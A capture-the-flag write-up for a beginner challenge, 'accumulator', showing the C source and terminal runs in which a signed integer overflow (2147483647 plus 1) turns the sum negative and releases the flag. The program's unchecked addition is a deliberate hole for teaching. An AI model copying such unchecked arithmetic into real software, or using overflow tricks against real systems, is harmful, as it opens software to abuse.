#accumulator

###Description
I found this program (accumulator64 file) that lets me add positive numbers to a variable,
but it won't give me a flag unless that variable is negative! Can you help me out?
Navigate to /problems/accumulator/ on the shell server to try your exploit out!

hint: How many bytes can an int store? How are positive and negative numbers represented in C?

###Solving
Okay, we have the binary file and a source code. The flag is on the remote server that runs given binary. So we need to find and exploit the binary's vulnerability. Let's do this.

First, let's try to run the binary.
<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./accumulator64
The accumulator currently has a value of 0.
Please enter a positive integer to add: 1
The accumulator currently has a value of 1.
Please enter a positive integer to add: 2
The accumulator currently has a value of 3.
Please enter a positive integer to add: 3
The accumulator currently has a value of 6.
Please enter a positive integer to add: 4
The accumulator currently has a value of 10.
Please enter a positive integer to add: 5
The accumulator currently has a value of 15.
Please enter a positive integer to add: 6
The accumulator currently has a value of 21.
Please enter a positive integer to add: ^C
</pre>

The programm just sums entered numbers with the accumulator. Fine, let's see the source code now.

```C
#include <stdlib.h>
#include <stdio.h>

int main(){

	int accumulator = 0;
	int n;
	while (accumulator >= 0){
		printf("The accumulator currently has a value of %d.\n",accumulator);
		printf("Please enter a positive integer to add: ");

		if (scanf("%d",&n) != 1){
			printf("Error reading integer.\n");
		} else {
			if (n < 0){
				printf("You can't enter negatives!\n");
			} else {
				accumulator += n;
			}
		}
	}
	gid_t gid = getegid();
	setresgid(gid,gid,gid);
	
	printf("The accumulator has a value of %d. You win!\n", accumulator);
	system("/bin/cat flag");

}
```

There are two variables - accumulator and some integer value named "n". After that, we see the loop, that continues while the accumulator value is positive. After this loop ends, executes the system command that prints the flag.

So, we need to make the accumulator value negative, but the problem is we are not to enter any negative. What do we do?

We remember that int variables take only 4 bytes of memory and it's maxed value equals to 2,147,483,647, and if we sum 1 to the variable with this value, it will overflow and take the value of minimal possible int value -2,147,483,648. Now the solution is obvious, we will input 2,147,483,647 first, and after that, we enter 1. Accumulator will take the negative value and we will get the flag.

Let's do this:

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./accumulator64
The accumulator currently has a value of 0.
Please enter a positive integer to add: 2147483647
The accumulator currently has a value of 2147483647.
Please enter a positive integer to add: 1
The accumulator has a value of -2147483648. You win!
HACKERMAN!
</pre>